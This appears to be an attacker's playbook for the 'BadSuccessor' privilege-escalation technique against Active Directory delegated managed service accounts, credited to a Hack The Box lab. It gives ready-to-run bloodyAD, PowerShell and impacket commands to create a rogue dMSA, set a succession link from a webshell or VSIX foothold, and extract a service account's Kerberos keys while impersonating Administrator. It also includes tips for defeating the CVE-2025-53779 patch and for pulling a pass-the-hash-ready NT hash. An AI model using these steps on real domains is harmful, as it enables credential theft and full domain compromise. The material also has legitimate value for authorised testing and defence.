# dMSA BadSuccessor Privilege Escalation (Bidirectional)

## When to use

- Active Directory environment with Windows Server 2025 DC (or 2022 with dMSA support)
- You have CREATE_CHILD permission in an OU (to create a dMSA object)
- You have GENERIC_WRITE on a target service account (to set the superseded link)
- DC is patched for CVE-2025-53779 (unpatched DCs only need one-sided link)
- Goal: extract the target service account's Kerberos keys

## Tags

- ATT&CK: T1558.003 (Kerberoasting), T1134 (Access Token Manipulation)
- Platform: Windows, Active Directory
- Services: AD DS, Kerberos
- Privileges: CREATE_CHILD on an OU + GENERIC_WRITE on target account

## How it works

Delegated Managed Service Accounts (dMSA) in Server 2025 can "succeed" a standard
service account, inheriting its Kerberos keys. By creating a dMSA with a
`PrecededByLink` pointing to a target account, and setting the corresponding
`SupersededManagedAccountLink` on the target, you establish a bidirectional
succession relationship. The DC then packages the target's keys into the dMSA's
KERB-DMSA-KEY-PACKAGE, which can be extracted via S4U2Self.

## Prerequisites

Two permissions needed (may require two different users):
1. **CREATE_CHILD** on an OU to create the dMSA object + set PrecededByLink
2. **GENERIC_WRITE** on the target service account to set SupersededManagedAccountLink

## Setting up the bidirectional link

### Step 1: Create dMSA with PrecededByLink (user with CREATE_CHILD)

```bash
# Using bloodyAD
bloodyAD -d <domain> -u <user1> -p '<pass>' --host <dc> add object \
  'CN=fakemsa,OU=Employees,DC=domain,DC=local' dMSA \
  --attr 'msDS-ManagedAccountPrecededByLink=CN=svc_target,CN=Managed Service Accounts,DC=domain,DC=local'
```

### Step 2: Set SupersededManagedAccountLink on target (user with GENERIC_WRITE)

```powershell
# From code execution context (VSIX, webshell, etc.)
Set-ADServiceAccount -Identity svc_target -Replace @{
    'msDS-SupersededManagedAccountLink' = 'CN=fakemsa,OU=Employees,DC=domain,DC=local'
    'msDS-SupersededServiceAccountState' = 1
}
```

Or via bloodyAD/ldap3 if you have GENERIC_WRITE from remote.

### Step 3: Extract keys via S4U2Self

```bash
impacket-getST -dmsa 'CN=fakemsa,OU=Employees,DC=domain,DC=local' \
  -self -impersonate Administrator -dc-ip <dc> 'domain/user1:pass'
```

The KERB-DMSA-KEY-PACKAGE contains the target's Kerberos keys.

## Operational notes

**Bidirectional is mandatory on patched DCs.** Unpatched DCs (pre CVE-2025-53779
fix) only need the PrecededByLink (one-sided, `--prepatch` flag in tools). Patched
DCs require both sides of the link. If `getST -dmsa` returns `KRB_ERR_GENERIC`,
the DC is patched and you need the SupersededManagedAccountLink too.

**Previous keys contain the working hash.** The KERB-DMSA-KEY-PACKAGE has "current"
and "previous" key sets. The target's working NT hash (usable for PtH) is typically
in the **previous** RC4 entry, not the current one.

**kerbad AES ordering fix.** impacket's kerbad module (v0.5.11) defaults to RC4
first in the etype list, which may fail against accounts with AES-only policy.
Patch `kerbad/common/creds.py` `get_supported_enctypes()` to put AES256 before
ARCFOUR_HMAC_MD5 in the password block.

**Clock skew.** All Kerberos operations require time sync with the DC (within 5
minutes). In VM/container environments, use `faketime -f '+Ns'` or `ntpdate` before
running impacket.

**Two-user split.** If no single user has both CREATE_CHILD and GENERIC_WRITE,
chain them: user1 creates the dMSA via LDAP, user2 sets the reverse link from
a code execution context (VSIX, webshell, etc.).

## Proven on

- Windows Server 2025 DC, patched (HTB Checkpoint, 2026-08-29): alex.turner created dMSA, ryan.brooks (via VSIX) set SupersededManagedAccountLink on svc_deploy, extracted svc_deploy's RC4 hash
